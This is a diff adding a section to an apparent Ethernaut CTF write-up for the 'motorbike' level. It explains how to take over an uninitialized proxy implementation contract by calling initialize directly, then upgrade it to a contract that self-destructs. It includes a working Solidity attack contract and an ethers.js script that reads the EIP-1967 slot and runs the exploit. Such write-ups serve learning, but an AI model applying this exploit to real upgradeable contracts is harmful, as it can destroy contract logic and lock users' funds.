@@ -740,5 +740,40 @@ await attack.deployed();
 console.log(await proxy.admin());
 ```
 
+---
+
+## motorbike
+
+Goal is to selfdestruct the engine. Implementation contract (Engine) has couple of storage variables `upgrader` and `horsepower`. One interesting function here is `upgradeToAndCall` which has a delegate call. This gave me idea to create a new contract with `selfdestruct` has delegate call to selfdestruct, but before that we need to become upgrader. Since `initialize` is called from `Motorbike`, `upgrader` and `horsePower` are stored in storage layout of `Motorbike` not `Engine`. 
+
+We can get the engine's address, call initialize again to become upgrader and rest is easy.
+
+```solidity
+contract EngineAttack {
+    function destruct(address payable to) external {
+        selfdestruct(to);
+    }
+}
+```
+
+```javascript
+storage = await ethers.provider.getStorageAt(INSTANCE_ADDRESS, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc", "latest");
+
+logicAddress = `0x${storage.slice(2).slice(24, 64)}`;
+
+engine = Engine.attach(logicAddress);
+
+tx = await engine.initialize();
+await tx.wait()
+
+const EngineHack = await hre.ethers.getContractFactory("EngineAttack");
+engineHack = await EngineHack.deploy()
+await engineHack.deployed()
+
+
+tx = await engine.upgradeToAndCall(engineHack.address, EngineHack.interface.encodeFunctionData('destruct', [owner.address]))
+await tx.wait();
+```
+
 
 
